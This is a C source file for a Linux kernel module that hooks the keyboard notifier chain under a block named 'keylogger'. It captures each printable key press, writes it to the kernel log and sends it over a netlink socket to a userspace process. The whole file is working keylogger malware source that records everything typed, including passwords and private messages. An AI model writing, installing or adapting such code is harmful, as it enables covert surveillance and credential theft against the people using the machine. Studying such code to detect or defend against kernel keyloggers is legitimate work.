#include <linux/module.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/keyboard.h>
// functions
void sendpacket(char *c);

// define
#define MY_NETLINK 30 // cannot be larger than 31, otherwise we shall get "insmod: ERROR: could not insert module netlink_kernel.ko: No child processes"
// global variables
int pid;
// structs

struct sock *nl_sk = NULL;

int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    char tav;
    struct keyboard_notifier_param *param = (struct keyboard_notifier_param *)p;
    tav = param->value;
    if ((int)code == KBD_KEYSYM && param->down == 1 && tav > 0x20 && tav < 0x7f)
    {
        sendpacket(&tav);
        printk(KERN_INFO " PRESSED %c\n", tav);
    }

    else if ((int)code == KBD_KEYSYM && param->down == 0 && tav > 0x20 && tav < 0x7f)
    {

        printk(KERN_INFO " RELEASED %c\n", tav);
    }
    return 1;
}

void sendpacket(char *c)
{
    struct nlmsghdr *nlhead;
    struct sk_buff *skb_out;
    int res, msg_size = 1;

    skb_out = nlmsg_new(msg_size, 0); // nlmsg_new - Allocate a new netlink message: skb_out

    if (!skb_out)
    {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }
    nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0); // Add a new netlink message to an skb
    NETLINK_CB(skb_out).dst_group = 0;
    strncpy((nlmsg_data(nlhead)), c, 1);
    res = nlmsg_unicast(nl_sk, skb_out, pid);

    if (res < 0)
        printk(KERN_INFO "Error while sending back to user\n");
}

struct notifier_block keylogger = {
    .notifier_call = notifier};

static void myNetLink_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlhead;

    nlhead = (struct nlmsghdr *)skb->data; // nlhead message comes from skb's data... (sk_buff: unsigned char *data)

    pid = nlhead->nlmsg_pid; // Sending process port ID, will send new message back to the 'user space sender'

    strncpy(nlmsg_data(nlhead), "received", 9); // char *strncpy(char *dest, const char *src, size_t count)
}

static int __init myNetLink_init(void)
{

    struct netlink_kernel_cfg cfg = {
        .input = myNetLink_recv_msg,
    };
    register_keyboard_notifier(&keylogger);

    /*netlink_kernel_create() returns a pointer, should be checked with == NULL */
    nl_sk = netlink_kernel_create(&init_net, MY_NETLINK, &cfg);
    printk("Entering: %s, protocol family = %d \n", __FUNCTION__, MY_NETLINK);
    if (!nl_sk)
    {
        printk(KERN_ALERT "Error creating socket.\n");
        return -10;
    }

    printk("MyNetLink Init OK!\n");
    return 0;
}

static void __exit myNetLink_exit(void)
{
    printk(KERN_INFO "exiting myNetLink module\n");
    netlink_kernel_release(nl_sk);
    unregister_keyboard_notifier(&keylogger);
}

module_init(myNetLink_init);
module_exit(myNetLink_exit);
MODULE_LICENSE("GPL");